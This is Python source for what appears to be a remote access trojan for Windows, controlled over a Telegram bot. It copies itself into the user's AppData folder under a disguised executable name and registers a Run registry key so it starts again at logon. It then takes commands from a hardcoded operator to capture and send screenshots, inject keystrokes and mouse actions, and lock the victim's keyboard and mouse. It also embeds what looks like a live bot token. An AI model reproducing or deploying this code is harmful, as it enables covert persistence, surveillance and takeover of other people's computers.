import re
import sys
import telebot
import pyautogui
from io import BytesIO
import time
import keyboard
import ctypes
import os
import shutil
import winreg
import subprocess
import pynput
App = 'PowerTous'
Program_folder = os.path.join(os.getenv('APPDATA'), 'Sosal')
Path = os.path.join(Program_folder, 'PowerTous.exe')
bot = telebot.TeleBot('7949245250:AAEPi3EkdjQy313VQsVDSdDRcMrDWcQytPk')
delay = 0.3
pixels_per_step = 10
id = 932476529
keys_to_block = [
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    '0','1','2','3','4','5','6','7','8', '9',
    'space','enter','tab','backspace','delete','insert',
    'home','end','page up','page down','up','down','left','right',
    'caps lock','num lock','scroll lock',
    'shift',
    'ctrl',
    'alt',
    'windows','menu',
    'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12'
]
mouse_listener = pynput.mouse.Listener(suppress=True)

def is_copy():
    return '--copy' in sys.argv

def add_to_autorun(path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        value = f'"{path}" --copy'
        winreg.SetValueEx(key, App, 0, winreg.REG_SZ, value)
        winreg.CloseKey(key)
    except:
        pass

def install_self():
    if not os.path.exists(Program_folder):
        os.makedirs(Program_folder)
    try:
        shutil.copy(sys.executable, Path)
    except:
        pass
    add_to_autorun(Path)
    subprocess.Popen([Path, "--copy"])
    sys.exit()

def copy():
    bot.send_message(id, 'Программа была запущена')
    # Константы
    MOUSEEVENTF_MOVE = 0x0001

    class MouseInput(ctypes.Structure):
        _fields_ = [("dx", ctypes.c_long),
                    ("dy", ctypes.c_long),
                    ("mouseData", ctypes.c_ulong),
                    ("dwFlags", ctypes.c_ulong),
                    ("time", ctypes.c_ulong),
                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

    class Input(ctypes.Structure):
        class _I(ctypes.Union):
            _fields_ = [("mi", MouseInput)]

        _anonymous_ = ("i",)
        _fields_ = [("type", ctypes.c_ulong),
                    ("i", _I)]

    def move_mouse_relative(x, y):
        inp = Input()
        inp.type = 0  # INPUT_MOUSE
        inp.mi.dx = x
        inp.mi.dy = y
        inp.mi.mouseData = 0
        inp.mi.dwFlags = MOUSEEVENTF_MOVE
        inp.mi.time = 0
        inp.mi.dwExtraInfo = None
        ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(inp))

    def move_mouse(direction, duration, speed=300, delay=0.01):
        """
        direction: строка — 'up', 'down', 'left', 'right'
        duration: время движения в секундах
        speed: скорость в пикселях в секунду
        delay: задержка между шагами в секундах
        """
        dir_map = {
            'up': (0, -1),
            'down': (0, 1),
            'left': (-1, 0),
            'right': (1, 0)
        }
        if direction not in dir_map:
            raise ValueError(f"Unknown direction '{direction}'. Choose from 'up', 'down', 'left', 'right'.")

        dx_unit, dy_unit = dir_map[direction]
        steps = int(duration / delay)
        pixels_per_step = speed * delay

        for _ in range(steps):
            move_mouse_relative(int(dx_unit * pixels_per_step), int(dy_unit * pixels_per_step))
            time.sleep(delay)

    @bot.message_handler(commands=['screenshot'])
    def screenshot(message):
        screen = pyautogui.screenshot()
        img_io = BytesIO()
        screen.save(img_io, format='PNG')
        img_io.seek(0)
        bot.send_photo(message.chat.id, img_io)

    @bot.message_handler(commands=['do'])
    def do(message):
        try:
            user_text = message.text.split('\n')[1:]
            for text in user_text:
                delay_match = re.search(r'\((\d+(\.\d+)?)\)', text)
                if delay_match:
                    delay = float(delay_match.group(1))
                    text = re.sub(r'\((\d+(\.\d+)?)\)', '', text)
                else:
                    delay = 0
                pressing_time_match = re.search(r'\[(\d+(\.\d+)?)\]', text)
                if pressing_time_match:
                    pressing_time = float(pressing_time_match.group(1))
                    text = re.sub(r'\[(\d+(\.\d+)?)\]', '', text)
                else:
                    pressing_time = 0
                pressing_quantity_match = re.search(r'\{(\d+(\.\d+)?)\}', text)
                if pressing_quantity_match:
                    pressing_quantity = int(pressing_quantity_match.group(1))
                    text = re.sub(r'\{(\d+(\.\d+)?)\}', '', text)
                else:
                    pressing_quantity = 1
                cmd, arg = text.split(' ', 1)
                arg = arg.strip()
                print(arg)
                if cmd == 'press' and pressing_time:
                    keyboard.press(arg)
                    time.sleep(pressing_time)
                    keyboard.release(arg)
                elif cmd == 'press':
                    for i in range(pressing_quantity):
                        time.sleep(0.1)
                        keyboard.send(arg)
                elif cmd == 'write':
                    keyboard.write(arg)
                elif cmd == 'mouse':
                    pyautogui.mouseDown(button=arg)
                    time.sleep(pressing_time)
                    pyautogui.mouseUp(button=arg)
                elif cmd == 'mouse_move':
                    move_mouse(arg, pressing_time)
                elif cmd == 'block':
                    if arg == 'all':
                        for key in keys_to_block:
                            try:
                             keyboard.block_key(key)
                            except:
                                pass
                        mouse_listener.start()
                    elif arg == 'off':
                        for key in keys_to_block:
                            try:
                             keyboard.unblock_key(key)
                            except:
                             pass
                        mouse_listener.stop()
                    elif arg =='mouse':
                        mouse_listener.start()
                    else:
                        try:
                         keyboard.block_key(arg)
                        except:
                            pass
                time.sleep(delay)
                time.sleep(0.3)
            bot.send_message(message.chat.id, 'Команды были выполнены')
        except Exception as e:
            bot.send_message(message.chat.id, e)

    bot.polling()

if __name__ == "__main__":
    if is_copy():
        copy()
    else:
        install_self()